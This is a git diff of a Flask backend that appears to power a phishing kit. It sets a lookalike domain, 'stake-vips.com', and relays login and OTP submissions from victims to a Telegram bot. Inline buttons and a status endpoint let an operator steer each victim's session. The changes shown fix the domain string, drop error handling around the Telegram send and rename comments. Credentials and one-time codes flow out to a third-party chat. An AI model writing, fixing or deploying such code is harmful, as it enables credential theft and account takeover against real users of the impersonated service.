@@ -3,7 +3,6 @@ from flask_cors import CORS
 import os
 import uuid
 import requests
-import time
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -14,8 +13,8 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-# 🔥 CHANGE THIS TO YOUR REAL DOMAIN
-BASE_URL = "https://stake-vips.comé"
+# ✅ FIXED (removed bad character)
+BASE_URL = "https://stake-vips.com"
 
 if not BOT_TOKEN or not CHAT_ID:
     raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")
@@ -33,7 +32,7 @@ PAGES = [
 ]
 
 # ======================
-# TELEGRAM
+# TELEGRAM SEND
 # ======================
 def send_to_telegram(data, session_id, type_):
     msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
@@ -54,11 +53,10 @@ def send_to_telegram(data, session_id, type_):
         "reply_markup": {"inline_keyboard": keyboard}
     }
 
-    try:
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
-    except:
-        pass
-
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        json=payload
+    )
 
 # ======================
 # LOGIN (CREATE SESSION)
@@ -80,7 +78,7 @@ def login():
 
 
 # ======================
-# REUSE SESSION (OTP ETC)
+# GENERIC STEP HANDLER
 # ======================
 def handle_step(step_name):
     data = request.get_json()
@@ -140,7 +138,7 @@ def webhook():
 
 
 # ======================
-# FRONTEND CHECK
+# FRONTEND STATUS CHECK
 # ======================
 @app.route("/status/<session_id>")
 def status(session_id):
